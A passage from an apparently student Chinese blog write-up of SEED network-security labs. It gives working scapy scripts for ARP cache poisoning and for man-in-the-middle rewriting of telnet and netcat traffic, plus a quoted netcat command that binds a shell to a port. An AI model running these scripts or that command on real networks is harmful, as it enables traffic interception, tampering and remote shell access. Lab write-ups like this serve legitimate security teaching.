%s\n&quot;</span>,inet_ntoa(ip-&gt;iph_destip));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要头文件：</p><details green><summary> 头文件myheader.h </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* ethernet headers are always exactly 14 bytes [1] */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_ETHERNET 14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ethernet addresses are 6 bytes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_ADDR_LEN  6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_LEN   1500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ethernet header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> &#123;</span></span><br><span class="line">    u_char  ether_dhost[ETHER_ADDR_LEN];    <span class="comment">/* destination host address */</span></span><br><span class="line">    u_char  ether_shost[ETHER_ADDR_LEN];    <span class="comment">/* source host address */</span></span><br><span class="line">    u_short ether_type;                     <span class="comment">/* IP? ARP? RARP? etc */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_ihl:<span class="number">4</span>, iph_ver:<span class="number">4</span>; <span class="comment">//IP Header length &amp; Version.</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_tos; <span class="comment">//Type of service</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_len; <span class="comment">//IP Packet length (Both data and header)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_flag:<span class="number">3</span>, iph_offset:<span class="number">13</span>; <span class="comment">//Flags and Fragmentation offset</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_protocol; <span class="comment">//Type of the upper-level protocol</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_sourceip</span>;</span> <span class="comment">//IP Source address (In network byte order)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_destip</span>;</span><span class="comment">//IP Destination address (In network byte order)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ICMP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> icmp_type; <span class="comment">//ICMP message type</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> icmp_code; <span class="comment">//Error code</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> icmp_chksum; <span class="comment">//Checksum for ICMP Header and data</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> icmp_id; <span class="comment">//Used in echo request/reply to identify request</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> icmp_seq;<span class="comment">//Identifies the sequence of echo messages, </span></span><br><span class="line">    <span class="comment">//if more than one is sent.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TCP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> &#123;</span></span><br><span class="line">    u_short tcp_sport;               <span class="comment">/* source port */</span></span><br><span class="line">    u_short tcp_dport;               <span class="comment">/* destination port */</span></span><br><span class="line">    u_int   tcp_seq;                 <span class="comment">/* sequence number */</span></span><br><span class="line">    u_int   tcp_ack;                 <span class="comment">/* acknowledgement number */</span></span><br><span class="line">    u_char  tcp_offx2;               <span class="comment">/* data offset, rsvd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_OFF(th)      (((th)-&gt;tcp_offx2 &amp; 0xf0) &gt;&gt; 4)</span></span><br><span class="line">    u_char  tcp_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_FIN  0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_SYN  0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_RST  0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_ACK  0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_URG  0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_ECE  0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_CWR  0x80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span></span><br><span class="line">    u_short tcp_win;                 <span class="comment">/* window */</span></span><br><span class="line">    u_short tcp_sum;                 <span class="comment">/* checksum */</span></span><br><span class="line">    u_short tcp_urp;                 <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* UDP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">u_int16_t</span> udp_sport;           <span class="comment">/* source port */</span></span><br><span class="line">  <span class="keyword">u_int16_t</span> udp_dport;           <span class="comment">/* destination port */</span></span><br><span class="line">  <span class="keyword">u_int16_t</span> udp_ulen;            <span class="comment">/* udp length */</span></span><br><span class="line">  <span class="keyword">u_int16_t</span> udp_sum;             <span class="comment">/* udp checksum */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudo_tcp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> saddr, daddr;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> mbz;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> ptcl;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> tcpl;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> <span class="title">tcp</span>;</span></span><br><span class="line">        <span class="keyword">char</span> payload[PACKET_LEN];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DNS layer header&#x27;s structure</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dnsheader</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> query_id;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> QDCOUNT;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ANCOUNT;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> NSCOUNT;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ARCOUNT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><h2 id="二、ARP缓存中毒"><a href="#二、ARP缓存中毒" class="headerlink" title="二、ARP缓存中毒"></a>二、ARP缓存中毒</h2><del>写到心态爆炸</del><h3 id="2-1-略"><a href="#2-1-略" class="headerlink" title="2.1 略"></a>2.1 略</h3><h3 id="2-2-中间人攻击"><a href="#2-2-中间人攻击" class="headerlink" title="2.2 中间人攻击"></a>2.2 中间人攻击</h3><p>作为中间人持续给A和B发送ARP请求数据包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import  *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Machine A&#x27;s informaton</span><br><span class="line">IP_A  = &quot;192.168.60.2&quot;</span><br><span class="line">MAC_A = &quot;02:42:c0:a8:3c:02&quot;</span><br><span class="line"></span><br><span class="line"># Machine B&#x27;s informaton</span><br><span class="line">IP_B  = &quot;192.168.60.1&quot;</span><br><span class="line">MAC_B = &quot;02:42:f3:a7:10:f7&quot;</span><br><span class="line"></span><br><span class="line"># Attacker Machine&#x27;s informaton</span><br><span class="line">IP_M  = &quot;192.168.60.3&quot;</span><br><span class="line">MAC_M = &quot;02:42:c0:a8:3c:03&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;SENDING SPOOFED ARP REPLY.........&quot;)</span><br><span class="line"></span><br><span class="line"># Construct spoofed ARP sent to machine A</span><br><span class="line">ether1     = Ether()</span><br><span class="line">ether1.dst = MAC_A</span><br><span class="line">arp1       = ARP()</span><br><span class="line">arp1.psrc  = IP_B</span><br><span class="line">arp1.hwsrc = MAC_M</span><br><span class="line">arp1.pdst  = IP_A</span><br><span class="line">arp1.op    = 1 </span><br><span class="line">frame1     = ether1/arp1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Construct spoofed ARP sent to machine B</span><br><span class="line">ether2      = Ether()</span><br><span class="line">ether2.dst  = MAC_B</span><br><span class="line">arp2        = ARP()</span><br><span class="line">arp2.psrc   = IP_A</span><br><span class="line">arp2.hwsrc  = MAC_M</span><br><span class="line">arp2.pdst   = IP_B</span><br><span class="line">arp2.op     = 1 </span><br><span class="line">frame2      = ether2/arp2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">   sendp(frame1) </span><br><span class="line">   sendp(frame2) </span><br><span class="line">   sleep(5)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-修改telnet响应报文"><a href="#2-3-修改telnet响应报文" class="headerlink" title="2.3 修改telnet响应报文"></a>2.3 修改telnet响应报文</h3><p>折磨我了几个小时，怎么改脚本都有问题。最后参考了ssj dl写的脚本，感觉也没啥太大不一样的。然后发现……..</p><p>{note, info red, 垃圾seedUbuntu虚拟机，重新启动之后会docker2网卡的MAC地址会发生变化，导致脚本出大问题！！！！}</p><p>最终的脚本如下：</p><p>修改telnet响应报文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"># Machine A&#x27;s informaton</span><br><span class="line">IP_A  = &quot;192.168.60.2&quot;</span><br><span class="line">MAC_A = &quot;02:42:c0:a8:3c:02&quot;</span><br><span class="line"></span><br><span class="line"># Machine B&#x27;s informaton</span><br><span class="line"># treat Gateway as Machine B</span><br><span class="line">IP_B  = &quot;192.168.60.1&quot;</span><br><span class="line">MAC_B = &quot;02:42:25:83:40:3f&quot;</span><br><span class="line"></span><br><span class="line"># Server2&#x27;s information</span><br><span class="line">IP_Server2 = &quot;10.0.2.7&quot;</span><br><span class="line">MAC_Server2 = &quot;02:42:0a:00:02:07&quot;</span><br><span class="line"></span><br><span class="line"># Attacker Machine&#x27;s informaton</span><br><span class="line">IP_M  = &quot;192.168.60.3&quot;</span><br><span class="line">MAC_M = &quot;02:42:c0:a8:3c:03&quot;</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">    if pkt.haslayer(IP):</span><br><span class="line">        if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_B</span><br><span class="line">            del pkt[IP].chksum</span><br><span class="line">            del pkt[TCP].chksum</span><br><span class="line">            sendp(pkt)</span><br><span class="line">        elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_A</span><br><span class="line">            del pkt[IP].chksum</span><br><span class="line">            del pkt[TCP].chksum</span><br><span class="line">            data = pkt[TCP].payload.load</span><br><span class="line">            newdata = re.sub(r&#x27;[0-9a-zA-Z]&#x27;, r&#x27;Z&#x27;, data.decode())</span><br><span class="line">            newdata = newdata.encode()</span><br><span class="line">            print(&quot;\tdata:&#123;&#125;\n\tnewdata:&#123;&#125;&quot;.format(data.decode(), newdata.decode()))</span><br><span class="line">            newpkt = pkt</span><br><span class="line">            del(newpkt[TCP].payload)</span><br><span class="line">            sendp(newpkt/newdata)</span><br><span class="line"></span><br><span class="line">f = &#x27;tcp and (ether src &#123;&#125; or ether src &#123;&#125;)&#x27;.format(MAC_A, MAC_B)</span><br><span class="line">pkt = sniff(filter=f, prn=spoof_pkt)</span><br></pre></td></tr></table></figure><p>贴一张截图：</p><p><img src="https://gitee.com/saying_yy/blog-image/raw/master/img/20210610012215.png" class="lazyload" data-srcset="https://gitee.com/saying_yy/blog-image/raw/master/img/20210610012215.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><details green><summary> 如果修改请求报文 </summary>              <div class='content'>              <p>实际上也可以修改请求报文。只不过，修改请求报文的结果是：输入任何都会回显Z，因为实际的输入被改为了Z，回车就会看到<code>command not found</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"># Machine A&#x27;s informaton</span><br><span class="line">IP_A  = &quot;192.168.60.2&quot;</span><br><span class="line">MAC_A = &quot;02:42:c0:a8:3c:02&quot;</span><br><span class="line"></span><br><span class="line"># Machine B&#x27;s informaton</span><br><span class="line"># treat Gateway as Machine B</span><br><span class="line">IP_B  = &quot;192.168.60.1&quot;</span><br><span class="line">MAC_B = &quot;02:42:25:83:40:3f&quot;</span><br><span class="line"></span><br><span class="line"># Server2&#x27;s information</span><br><span class="line">IP_Server2 = &quot;10.0.2.7&quot;</span><br><span class="line">MAC_Server2 = &quot;02:42:0a:00:02:07&quot;</span><br><span class="line"></span><br><span class="line"># Attacker Machine&#x27;s informaton</span><br><span class="line">IP_M  = &quot;192.168.60.3&quot;</span><br><span class="line">MAC_M = &quot;02:42:c0:a8:3c:03&quot;</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">    if pkt.haslayer(IP):</span><br><span class="line">        if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_B</span><br><span class="line">            del pkt[IP].chksum</span><br><span class="line">            del pkt[TCP].chksum</span><br><span class="line">            if pkt.haslayer(TCP) and pkt[TCP].payload:</span><br><span class="line">                data = pkt[TCP].payload.load</span><br><span class="line">                newdata = re.sub(r&#x27;[0-9a-zA-Z]&#x27;, r&#x27;Z&#x27;, data.decode())</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                print(&quot;\tdata:&#123;&#125;\n\tnewdata:&#123;&#125;&quot;.format(data.decode(), newdata.decode()))</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                del(newpkt[TCP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            else:</span><br><span class="line">                sendp(pkt)</span><br><span class="line">        elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_A</span><br><span class="line">            del pkt[IP].chksum</span><br><span class="line">            del pkt[TCP].chksum</span><br><span class="line">            sendp(pkt)</span><br><span class="line"></span><br><span class="line">f = &#x27;tcp and (ether src &#123;&#125; or ether src &#123;&#125;)&#x27;.format(MAC_A, MAC_B)</span><br><span class="line">pkt = sniff(filter=f, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="2-4-修改netcat报文"><a href="#2-4-修改netcat报文" class="headerlink" title="2.4 修改netcat报文"></a>2.4 修改netcat报文</h3><p>先copy一下nc手册的关于远程命令执行的一段话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">There is no -c or -e option in this netcat, but you still can execute a</span><br><span class="line">command after connection being established by redirecting file descrip-</span><br><span class="line">tors. Be cautious here because opening a port and let anyone connected</span><br><span class="line">execute arbitrary command on your site is DANGEROUS. If you really need</span><br><span class="line">to do this, here is an example:</span><br><span class="line"></span><br><span class="line">On &#x27;server&#x27; side:</span><br><span class="line"></span><br><span class="line">      $ rm -f /tmp/f; mkfifo /tmp/f</span><br><span class="line">      $ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f</span><br><span class="line"></span><br><span class="line">On &#x27;client&#x27; side:</span><br><span class="line"></span><br><span class="line">      $ nc host.example.com 1234</span><br><span class="line">      $ (shell prompt from host.example.com)</span><br><span class="line"></span><br><span class="line">By doing this, you create a fifo at /tmp/f and make nc listen at port</span><br><span class="line">1234 of address 127.0.0.1 on &#x27;server&#x27; side, when a &#x27;client&#x27; establishes a</span><br><span class="line">connection successfully to that port, /bin/sh gets executed on &#x27;server&#x27;</span><br><span class="line">side and the shell prompt is given to &#x27;client&#x27; side.</span><br></pre></td></tr></table></figure><p>按照手册运行nc。</p><p>nc脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"># Machine A&#x27;s informaton</span><br><span class="line">IP_A  = &quot;192.168.60.2&quot;</span><br><span class="line">MAC_A = &quot;02:42:c0:a8:3c:02&quot;</span><br><span class="line"></span><br><span class="line"># Machine B&#x27;s informaton</span><br><span class="line"># treat Gateway as Machine B</span><br><span class="line">IP_B  = &quot;192.168.60.1&quot;</span><br><span class="line">MAC_B = &quot;02:42:25:83:40:3f&quot;</span><br><span class="line"></span><br><span class="line"># Server2&#x27;s information</span><br><span class="line">IP_Server2 = &quot;10.0.2.7&quot;</span><br><span class="line">MAC_Server2 = &quot;02:42:0a:00:02:07&quot;</span><br><span class="line"></span><br><span class="line"># Attacker Machine&#x27;s informaton</span><br><span class="line">IP_M  = &quot;192.168.60.3&quot;</span><br><span class="line">MAC_M = &quot;02:42:c0:a8:3c:03&quot;</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">    if pkt.haslayer(IP):</span><br><span class="line">        if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_B</span><br><span class="line">            del pkt[IP].chksum</span><br><span class="line">            del pkt[TCP].chksum</span><br><span class="line">            if pkt.haslayer(TCP) and pkt[TCP].payload:</span><br><span class="line">                data = pkt[TCP].payload.load</span><br><span class="line">                newdata = &#x27;U2019xxxxx_name\x0a&#x27;</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                print(&quot;\tdata:&#123;&#125;\n\tnewdata:&#123;&#125;&quot;.format(data.decode(), newdata.decode()))</span><br><span class="line">                # length = pkt[IP].len - len(data) + len(newdata)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                del(newpkt[IP].len)</span><br><span class="line">                del(newpkt[TCP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            else:</span><br><span class="line">                sendp(pkt)</span><br><span class="line">        elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_A</span><br><span class="line">            del pkt[IP].chksum</span><br><span class="line">            del pkt[TCP].chksum</span><br><span class="line">            sendp(pkt)</span><br><span class="line"></span><br><span class="line">f = &#x27;tcp and (ether src &#123;&#125; or ether src &#123;&#125;)&#x27;.format(MAC_A, MAC_B)</span><br><span class="line">pkt = sniff(filter=f, prn=spoof_pkt)</span><br></pre></td></tr></table></figure><p>但是修改报文只能在修改前后长度相同的情况下才能成功。原因希腊奶。</p><h2 id="三、DH密钥交换中间人攻击"><a href="#三、DH密钥交换中间人攻击" class="headerlink" title="三、DH密钥交换中间人攻击"></a>三、DH密钥交换中间人攻击</h2><p><strong>这是第十次攻防实践的内容，但也是中间人攻击</strong></p><del>然而我感觉好复杂啊</del><div class="note warning"><p>本次实验不建议参考本博客。因为seedubuntu太拉垮，装高版本python3和pycryptodome时会出现各种问题。很难跑通。</p></div><h3 id="3-1-简单设计协议"><a href="#3-1-简单设计协议" class="headerlink" title="3.1 简单设计协议"></a>3.1 简单设计协议</h3><div class="note info"><p>关于DH密钥交换可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1304227905273889">密钥交换算法-廖雪峰的官方网站</a></p></div><p>就整了个极其拉垮的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">            DH handshake request</span><br><span class="line">+--------------------+----------+----------+</span><br><span class="line">|    